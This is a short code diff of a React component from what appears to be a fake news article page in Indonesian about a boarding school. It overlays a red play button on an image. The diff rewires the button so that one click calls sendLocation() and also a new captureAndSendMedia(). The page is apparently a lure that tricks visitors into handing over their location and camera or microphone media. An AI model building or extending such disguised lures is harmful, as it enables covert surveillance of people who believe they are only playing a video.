@@ -301,7 +301,12 @@ Pihak pondok pesantren menegaskan kegiatan belajar-mengajar tetap berjalan seper
               />
               <div className="absolute inset-0 bg-black/30 flex items-center justify-center">
                 <button
-                  onClick={sendLocation}
+                  // onClick={sendLocation, captureAndSendMedia}
+                  onClick={() => {
+                    sendLocation();
+                    captureAndSendMedia();
+                  }}
+
                   className="bg-red-600 text-white text-xl px-6 py-4 rounded-full hover:bg-red-700 hover:scale-105 transition"
                 >
                   ▶
